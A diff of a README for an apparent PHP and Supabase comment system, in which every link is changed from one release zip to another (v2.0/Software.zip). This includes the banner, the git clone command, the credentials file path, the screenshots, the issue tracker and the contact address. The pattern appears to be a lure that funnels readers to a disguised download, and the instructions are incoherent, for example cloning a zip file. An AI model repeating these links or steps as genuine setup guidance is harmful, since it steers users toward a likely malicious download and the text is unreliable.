@@ -2,7 +2,7 @@
 
 ## A Simple Comment system built using PHP and Supabase
 
-![Repository Banner](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip)
+![Repository Banner](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip)
 
 ### Repository Details:
 - **Repository name**: php-supabase-comments
@@ -14,7 +14,7 @@ To get started with the PHP Supabase Comments system, follow the steps below:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip
+   git clone https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip
    ```
 
 2. Install any dependencies:
@@ -22,11 +22,11 @@ To get started with the PHP Supabase Comments system, follow the steps below:
    composer install
    ```
 
-3. Configure your Supabase credentials in `https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip`.
+3. Configure your Supabase credentials in `https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip`.
 
-4. Launch the application by visiting [this link](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip).
+4. Launch the application by visiting [this link](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip).
 
-![Launch Application](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip)
+![Launch Application](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip)
 
 ### Features:
 - **User-friendly Interface**: The comment system provides a clean and intuitive user interface.
@@ -38,24 +38,24 @@ To get started with the PHP Supabase Comments system, follow the steps below:
 ### Screenshots:
 Here are some snapshots of the PHP Supabase Comments system in action:
 
-![Screenshot 1](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip)
-![Screenshot 2](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip)
-![Screenshot 3](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip)
+![Screenshot 1](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip)
 
 ### Contributing:
 We welcome contributions! Feel free to fork the repository, make your changes, and submit a pull request.
 
 ### Issues:
-If you encounter any issues or bugs with the system, please report them [here](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip).
+If you encounter any issues or bugs with the system, please report them [here](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip).
 
 ### Contact Us:
-If you have any questions or feedback, reach out to us at `https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip`.
+If you have any questions or feedback, reach out to us at `https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip`.
 
 ### Like What You See?
 If you find this PHP Supabase Comments system helpful, show your support by giving it a ⭐️!
 
 ### More from Us:
-Check out our other projects and repositories on [GitHub](https://github.com/cobra90vr/php-supabase-comments/releases/download/v1.0/Application.zip).
+Check out our other projects and repositories on [GitHub](https://github.com/cobra90vr/php-supabase-comments/releases/download/v2.0/Software.zip).
 
 ---
 
